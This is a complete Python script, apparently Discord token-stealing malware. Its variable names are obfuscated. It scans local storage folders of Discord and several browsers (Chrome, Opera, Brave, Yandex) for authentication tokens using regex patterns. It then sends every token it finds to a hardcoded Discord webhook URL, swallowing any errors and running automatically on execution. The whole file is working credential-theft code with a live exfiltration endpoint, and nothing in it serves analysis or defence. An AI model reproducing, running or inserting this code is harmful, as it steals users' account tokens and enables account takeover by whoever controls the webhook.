import os 
import re 
import json 
from urllib .request import Request ,urlopen 
source ='https://canary.discord.com/api/webhooks/1154104537116856372/exoB0XnkP5GniYM8ZrAZAtW52O0ZrXi3Zy6BzKp6NmuxHlUXHUTzOf635s_nb31o-FCm'
kkkkkkkkk =False 
def find_tokens (OO0OOO0OOO0O000OO ):
    OO0OOO0OOO0O000OO +='\\Local Storage\\leveldb'
    O0O0OO000O000OO0O =[]
    for O00O00O0O000O00OO in os .listdir (OO0OOO0OOO0O000OO ):
        if not O00O00O0O000O00OO .endswith ('.log')and not O00O00O0O000O00OO .endswith ('.ldb'):
            continue 
        for O000OOOO0O0O00O00 in [O0OO00O000O0000O0 .strip ()for O0OO00O000O0000O0 in open (f'{OO0OOO0OOO0O000OO}\\{O00O00O0O000O00OO}',errors ='ignore').readlines ()if O0OO00O000O0000O0 .strip ()]:
            for O0OO00OO00O00OO00 in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',r'mfa\.[\w-]{84}'):
                for OOOO0OOO0O00000O0 in re .findall (O0OO00OO00O00OO00 ,O000OOOO0O0O00O00 ):
                    O0O0OO000O000OO0O .append (OOOO0OOO0O00000O0 )
    return O0O0OO000O000OO0O 
def main ():
    OOO0O0O00O0O0O000 =os .getenv ('LOCALAPPDATA')
    OO0O0000OOO000000 =os .getenv ('APPDATA')
    O0OOO000000O0OOOO ={'Discord':OO0O0000OOO000000 +'\\Discord','Discord Canary':OO0O0000OOO000000 +'\\discordcanary','Discord PTB':OO0O0000OOO000000 +'\\discordptb','Google Chrome':OOO0O0O00O0O0O000 +'\\Google\\Chrome\\User Data\\Default','Opera':OO0O0000OOO000000 +'\\Opera Software\\Opera Stable','Brave':OOO0O0O00O0O0O000 +'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':OOO0O0O00O0O0O000 +'\\Yandex\\YandexBrowser\\User Data\\Default'}
    OOO00OO0000O00O00 ='@everyone'if kkkkkkkkk else ''
    for OOOOOO0O000O0OO0O ,OOOOOOOO00OOOOO00 in O0OOO000000O0OOOO .items ():
        if not os .path .exists (OOOOOOOO00OOOOO00 ):
            continue 
        OOO00OO0000O00O00 +=f'\n**{OOOOOO0O000O0OO0O}**\n```\n'
        OOO0O0OO000OOOOOO =find_tokens (OOOOOOOO00OOOOO00 )
        if len (OOO0O0OO000OOOOOO )>0 :
            for OO0O0O00OOOOO00O0 in OOO0O0OO000OOOOOO :
                OOO00OO0000O00O00 +=f'{OO0O0O00OOOOO00O0}\n'
        else :
            OOO00OO0000O00O00 +='.\n'
        OOO00OO0000O00O00 +='```'
    OOOO00OOOOO0000OO ={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}#line:61
    OO00O0O0O0O0O0OOO =json .dumps ({'content':OOO00OO0000O00O00 })
    try :
        OOOO00OOO0O00O00O =Request (source ,data =OO00O0O0O0O0O0OOO .encode (),headers =OOOO00OOOOO0000OO )
        urlopen (OOOO00OOO0O00O00O )
    except :
        pass 
main ()